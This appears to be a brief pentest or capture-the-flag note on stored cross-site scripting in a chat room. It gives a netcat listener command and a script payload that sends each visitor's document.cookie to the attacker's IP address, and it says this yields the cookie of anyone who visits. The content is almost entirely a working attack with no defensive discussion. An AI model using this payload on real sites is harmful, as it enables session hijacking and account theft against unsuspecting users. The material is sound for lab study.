# XSS 
## Stored XX
### Chat Room XSS
- Start a netcat listener on your attack box
````
nc -nlvp 4444
````
- Take this XSS payload and paste it in the chat room and submit:
````
<script>window.location='http://10.13.**.**:4444/?cookie='+document.cookie</script>
````
- Page should reload and you should have the cookie of anyone that visits the chat room 
